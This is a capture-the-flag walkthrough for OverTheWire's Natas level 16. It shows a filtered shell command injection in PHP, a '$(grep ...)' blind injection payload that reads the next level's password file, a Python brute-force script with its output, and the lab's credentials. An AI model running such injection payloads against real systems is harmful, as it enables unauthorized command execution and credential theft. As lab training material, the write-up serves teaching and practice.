# Natas Level 16

> Username: natas16

> Password: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb

> URL: http://natas16.natas.labs.overthewire.org

## Solution

Entering the URL, we found something similar to `level 10`, but now they said `For security reasons, we now filter even more on certain characters`.

Let's view the source code to see the filtered characters.

```php
<pre>
<?
ini_set('pcre.jit', 0);
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>
```

We can see that the developer did not block `$()` which is `command substitution`.
In Linux, `$()` means execute the command inside the parentheses and replace the expression with its output.

But if we try something like `$(cat /etc/natas_webpass/natas17)` the shell reads the password and inserts it as the grep search pattern and search for it on the `dictionary.txt`, and this gives no output.

This is a `Blind Command Injection`. So the trick here is to search for a known dictionary word like `English`, and then use `grep` within the command substitution to returns the password if it starts with `a`, and returns nothing otherwise. So the payload become like this:

```text
English$(grep ^a /etc/natas_webpass/natas17)
```

We use the word `English` to see the difference in the output, so if the password doesn't start with `a` the inner `grep` returns nothing so the command becomes `grep -i "English" dictionary.txt` and this word gives output. But if the password start with `a` the inner `grep` returns the actual password, the command becomes `grep -i "EnglishXa8j2la..." dictionary.txt`, and this word is not in the dictionary. With this we can find every letter in the password. And this called `Boolean oracle`.

So let's write a script to automate this process.

```python
import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb")

characters = string.ascii_letters + string.digits
password = ""

session = requests.Session()
session.auth = auth

for position in range(32):
    for char in characters:
        guess = password + char

        payload = (
            f"English$(grep ^{guess} "
            f"/etc/natas_webpass/natas17)"
        )

        response = session.get(
            url,
            params={"needle": payload}
        )

        # A missing dictionary match suggests
        # the password starts with our guess.
        if "English" not in response.text:
            password += char
            print("Found:", password)
            break
    else:
        print("No candidate matched at position", position + 1)
        break

print("Password:", password)
```

Running it we will have something like:

```text
Found: K
Found: KL
Found: KLd
Found: KLdA
Found: KLdAM
Found: KLdAM3
Found: KLdAM3V
Found: KLdAM3VZ
Found: KLdAM3VZu
Found: KLdAM3VZux
Found: KLdAM3VZux8
Found: KLdAM3VZux8o
Found: KLdAM3VZux8o6
Found: KLdAM3VZux8o6T
Found: KLdAM3VZux8o6Tb
Found: KLdAM3VZux8o6Tbk
Found: KLdAM3VZux8o6Tbkb
Found: KLdAM3VZux8o6Tbkbh
Found: KLdAM3VZux8o6Tbkbhu
Found: KLdAM3VZux8o6Tbkbhua
Found: KLdAM3VZux8o6TbkbhuaG
Found: KLdAM3VZux8o6TbkbhuaG5
Found: KLdAM3VZux8o6TbkbhuaG5K
Found: KLdAM3VZux8o6TbkbhuaG5Kt
Found: KLdAM3VZux8o6TbkbhuaG5KtY
Found: KLdAM3VZux8o6TbkbhuaG5KtYj
Found: KLdAM3VZux8o6TbkbhuaG5KtYjI
Found: KLdAM3VZux8o6TbkbhuaG5KtYjI7
Found: KLdAM3VZux8o6TbkbhuaG5KtYjI77
Found: KLdAM3VZux8o6TbkbhuaG5KtYjI77t
Found: KLdAM3VZux8o6TbkbhuaG5KtYjI77tf
Found: KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
Password: KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
```

```text
KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
```

